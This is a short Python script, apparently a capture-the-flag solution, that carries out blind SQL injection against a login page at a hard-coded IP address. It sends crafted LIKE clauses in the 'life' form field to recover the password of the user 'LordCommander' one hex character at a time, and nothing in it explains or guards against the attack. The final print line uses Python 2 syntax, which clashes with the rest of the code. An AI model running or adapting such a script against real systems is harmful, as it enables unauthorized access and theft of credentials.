import requests
import string

url = 'http://163.172.176.29/WALL/index.php'

response = ''
sofar = ''
while True:
    done = 1
    for char in "0123456789abcdef":
        print(char)
        params = {'life':'LordCommander\' AND password LIKE \''+ sofar + char + '%', 'soul':''}
        r = requests.post(url, data=params)

        if "LordCommander" in r.text:
            sofar += char
            print("sofar=", sofar)
            done = 0
            break
    if done == 1:
        break
print sofar
